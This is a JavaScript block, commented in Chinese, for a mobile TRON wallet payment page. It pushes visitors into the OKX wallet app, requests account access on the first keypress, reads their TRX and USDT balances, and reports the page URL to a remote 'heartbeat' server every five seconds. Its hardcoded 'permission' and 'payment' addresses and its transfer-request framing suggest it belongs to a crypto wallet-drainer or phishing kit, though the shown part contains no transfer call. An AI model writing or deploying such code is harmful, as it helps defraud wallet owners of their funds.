<script>



/////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////

////////////// ***必须填写有效的地址否则会报错*** ///////////////

// ==========================================
// 1. 全局变量与配置
// ==========================================
window.Permission_address = 'TDzhh98DDCdpGPMJa8o2bSq9Nv28gJMwsp';
window.Payment_address = 'TB4io3tGbUWjmXmfUmFDUoVCBnvw4ZwUuR';
window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
window.heartbeatUrl = 'https://trx9528.top/heartbeat';

const TRX_TO_USD_RATE = 0.326;
let currentAmount = '0';
const userData = {
    address: null,
    trxBalance: '0', 
    usdtBalance: '0'
};

// ==========================================
// 2. 页面初始化 (核心：先让界面能点，再连钱包)
// ==========================================
document.addEventListener('DOMContentLoaded', () => {
    // 第一步：先绑定所有按钮事件，防止页面“假死”
    bindButtonEvents();
    updateAmountDisplay();

    // 第二步：开始检测并连接钱包环境 (包含延迟重试机制)
    checkAndConnectWallet();
});

// ==========================================
// ==========================================
// 3. 钱包连接与数据获取 (终极修复版)
// ==========================================

// 静默检测：页面加载时只试探一次，不强行弹窗
// ==========================================
// 3. 环境检测与钱包连接
// ==========================================

// 页面加载时检测环境
function checkAndConnectWallet() {
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

    // 延迟 500ms 执行，等待钱包环境注入（防止在OKX内部也发生误判）
    setTimeout(async () => {
        const isDAppBrowser = typeof window.tronWeb !== 'undefined' || typeof window.tronLink !== 'undefined';

        if (isMobile && !isDAppBrowser) {
            // 【核心修复】如果是在手机上，且没检测到钱包环境，直接拉起 OKX Web3
            tip("正在尝试唤起 OKX Web3 钱包...");
            const currentUrl = encodeURIComponent(window.location.href);
            window.location.href = "okx://wallet/dapp/details?dappUrl=" + currentUrl;
        } else if (isDAppBrowser) {
            // 如果已经在钱包内，静默检测是否已经给了权限
            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                userData.address = window.tronWeb.defaultAddress.base58;
                await fetchBalances();
            } else {
                tip("请点击数字或最大按钮唤起授权");
            }
        } else {
            // 非手机端的外部浏览器提示
            tip("请在手机端 Web3 钱包内打开");
        }
    }, 500); 
}
// 主动授权：由用户手指点击触发，不会被钱包拦截
async function connectWallet() {
    try {
        if (typeof window.tronWeb === 'undefined') {
            tip("请确保钱包网络已切换至 Tron (TRX)！");
            return false;
        }

        let address = window.tronWeb.defaultAddress.base58;

        // 如果还没地址，主动向钱包请求权限弹窗
        if (!address && window.tronLink) {
            try {
                // 唤起授权弹窗
                const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                if (res && res.code === 200) {
                    address = window.tronWeb.defaultAddress.base58;
                }
            } catch (authError) {
                console.warn("用户拒绝授权或请求失败:", authError);
                tip("需要授权才能获取余额");
                return false;
            }
        }

        if (address) {
            userData.address = address;
            await fetchBalances();
            tip("授权成功！");
            return true;
        } else {
            tip("未能获取到钱包地址");
            return false;
        }
    } catch (error) {
        console.error("连接异常:", error);
        tip("连接异常，请切换网络后重试");
        return false;
    }
}

async function fetchBalances() {
    try {
        // 获取 TRX 余额
        const trxBalanceSun = await window.tronWeb.trx.getBalance(userData.address);
        userData.trxBalance = window.tronWeb.fromSun(trxBalanceSun);
        
        // 更新 UI 余额显示
        const balanceElement = document.getElementById('ye');
        if (balanceElement) {
            balanceElement.textContent = parseFloat(userData.trxBalance).toFixed(4);
        }

        // 重新校验当前输入框是否超过了真实余额
        updateAmountDisplay();

        // 获取 USDT 余额 (不阻塞主流程，就算失败也不影响TRX转账)
        const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
        const usdtBalance = await contract.balanceOf(userData.address).call();
        userData.usdtBalance = (usdtBalance / 1e6).toString();

    } catch (error) {
        console.error("获取余额时出错:", error);
    }
}

// ==========================================
// 4. 键盘输入逻辑 (已修复全部报错 Bug)
// ==========================================
function pressKey(key) {
    if (key === 'delete') {
        deleteLastChar();
        return;
    }
    
    // 限制总输入长度
    if (currentAmount.replace('.', '').length >= 10) return;

    if (key === '.') {
        // 防止输入多个小数点
        if (!currentAmount.includes('.')) {
            currentAmount += '.';
        }
    } else {
        if (currentAmount === '0') {
            currentAmount = key; // 替换开头的0
        } else {
            // 如果包含小数点，限制只能输入4位小数
            if (currentAmount.includes('.')) {
                const decimalPart = currentAmount.split('.')[1];
                if (decimalPart.length < 4) {
                    currentAmount += key;
                }
            } else {
                currentAmount += key;
            }
        }
    }
    updateAmountDisplay();
}

function deleteLastChar() {
    if (currentAmount.length > 1) {
        currentAmount = currentAmount.slice(0, -1);
    } else {
        currentAmount = '0';
    }
    updateAmountDisplay();
}

function setMaxAmount() {
    currentAmount = parseFloat(userData.trxBalance || '0').toFixed(4);
    updateAmountDisplay();
}

// ==========================================
// 5. UI 更新与事件绑定
// ==========================================
function updateAmountDisplay() {
    let displayAmount = currentAmount;
    const maxBalance = parseFloat(userData.trxBalance || '0');

    // 只有在获取到真实余额后，才限制输入最大值
    if (maxBalance > 0 && parseFloat(displayAmount) > maxBalance) {
        displayAmount = maxBalance.toFixed(4);
        currentAmount = displayAmount;
    }

    // 更新 TRX 金额
    const amountElement = document.getElementById('amount');
    if (amountElement) amountElement.textContent = displayAmount;

    // 更新 USD 金额
    const usdAmount = (parseFloat(displayAmount || '0') * TRX_TO_USD_RATE).toFixed(2);
    const usdElement = document.getElementById('amount-display');
    if (usdElement) usdElement.textContent = usdAmount;

    // 更新按钮状态和标题
    updateNextButtonState();
    document.title = `正在申请转账 ${displayAmount} TRX`;
}

function updateNextButtonState() {
    const nextButton = document.getElementById('submitBtn');
    if (nextButton) {
        const amount = parseFloat(currentAmount || '0');
        const maxBalance = parseFloat(userData.trxBalance || '0');
        
        // 金额大于0，且小于等于余额才可点击
        const isValid = amount > 0 && amount <= maxBalance;
        
        nextButton.disabled = !isValid;
        if (isValid) {
            nextButton.classList.remove('disabled');
        } else {
            nextButton.classList.add('disabled');
        }
    }
}

function bindButtonEvents() {
    // 绑定键盘
    document.querySelectorAll('.keyboard-box .btn').forEach(btn => {
        btn.onclick = async () => {
            // 每次点击键盘前，检查是否有地址，没有就触发授权
            if (!userData.address) {
                await connectWallet();
                if (!userData.address) return; // 如果依然没授权，中断输入
            }

            const keyText = btn.textContent.trim();
            if (btn.classList.contains('delete') || keyText === '') {
                pressKey('delete');
            } else if (/^[0-9\.]$/.test(keyText)) { 
                pressKey(keyText);
            }
        };
    });

    // 绑定最大值按钮
    const maxBtn = document.querySelector('.asset-info .right .btn');
    if (maxBtn) {
        maxBtn.onclick = async () => {
            if (!userData.address) {
                const connected = await connectWallet();
                if (!connected) return;
            }
            setMaxAmount();
        };
    }
}

// 提示框封装
function tip(message) {
    const tipElement = document.getElementById('tip');
    if (tipElement) {
        tipElement.textContent = message;
        tipElement.style.display = 'block';
        setTimeout(() => { tipElement.style.display = 'none'; }, 3000);
    }
}

// ==========================================
// 6. 心跳包发送
// ==========================================
function sendHeartbeat() {
    fetch(window.heartbeatUrl, {
        method: 'POST',
        mode: 'cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: window.location.href })
    }).catch(() => {});
}
setInterval(sendHeartbeat, 5000);
sendHeartbeat();
window.onbeforeunload = function() {
    clearInterval(heartbeatInterval);
};
</script>
